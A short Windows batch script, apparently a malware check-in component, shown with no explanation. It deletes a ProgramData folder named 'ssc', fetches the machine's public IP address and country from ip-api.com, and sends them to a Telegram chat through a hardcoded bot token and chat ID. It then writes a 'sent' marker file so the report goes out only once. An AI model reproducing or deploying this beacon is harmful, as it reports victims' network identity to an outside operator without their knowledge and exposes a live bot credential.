rd /s /q "%ProgramData%\ssc"
if exist "%ProgramData%\sent" exit /b
chcp 65001 > nul
set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
set "CHAT_ID=-4955395962"

for /f "tokens=1,2 delims=|" %a in ('powershell -NoProfile -Command "try { $j = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($j.query + '|' + $j.country) } catch { Write-Host 'No IP|No Country' }"') do (
    set "IP=%a"
    set "Country=%b"
)

powershell -NoProfile -Command "$msg = 'TRF' + [Environment]::NewLine + 'IP: %IP%' + [Environment]::NewLine + 'Country: %Country%'; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$msg} } catch {}"
echo done > "%ProgramData%\sent"
endlocal
